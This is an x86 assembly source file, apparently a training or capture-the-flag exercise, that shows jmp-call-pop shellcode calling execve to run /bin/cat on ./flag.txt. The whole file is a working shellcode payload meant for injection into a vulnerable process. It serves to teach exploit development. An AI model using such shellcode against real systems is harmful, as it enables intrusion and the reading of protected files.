; Filename: execve-cat-flag_JmpCallPop.asm
; Author: Cameron, James
; Purpose: Demonstrate execve /bin/cat ./flag.txt shellcode using jmp call pop technique
; Tested On: Linux ubuntu 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
;            Ubuntu 12.04.4 LTS



section .text

global _start

_start:

	jmp short call_shellcode

shellcode:
            ; int execve(const char *filename, char *const argv[],
            ;            char *const envp[]);
            ; #define __NR_execve              11

	pop esi
	xor eax, eax
	mov byte [esi + 8], al          ; null terminate /bin/cat
	mov byte [esi + 19], al         ; null terminate ./flag.txt
	mov dword [esi + 20], esi       ; mov argv[0] into CCCC
	lea ebx, [esi + 9]              ; load address of argv[1]
	mov dword [esi + 24], ebx       ; argv[1] into DDDD
	mov dword [esi + 28], eax       ; null terminate argv / envp

	mov al, 0xb                ; execve syscall
	lea ebx, [esi]             ; filename
	lea ecx, [esi + 20]        ; argv
	lea edx, [esi + 28]        ; envp
	int 0x80                   ; execute syscall


call_shellcode:
	call shellcode
	buf: db "/bin/catA./flag.txtBCCCCDDDDEEEE"
